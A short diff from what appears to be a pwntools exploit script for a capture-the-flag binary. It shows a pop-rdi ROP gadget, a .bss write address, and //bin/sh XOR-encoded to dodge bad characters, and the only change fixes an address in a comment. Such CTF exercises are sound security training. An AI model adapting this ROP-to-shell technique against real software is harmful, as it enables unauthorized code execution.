@@ -18,7 +18,7 @@ pop_rdi = p64(0x0000000000400b39) # pop rdi; ret;                    #
                                                                      #
 target_addr = 0x601080                                               #
                                                                      #
-# 0x0804a040 is the beginning of the .bss <--- Where                 #
+# 0x601080 is the beginning of the .bss <--- Where                 #
 where = p64(0x601080)                                                #
                                                                      #
 # 2d 2d 60 6b 6c 2d 71 6a == //bin/sh XOR by 0x2 <--- What           #
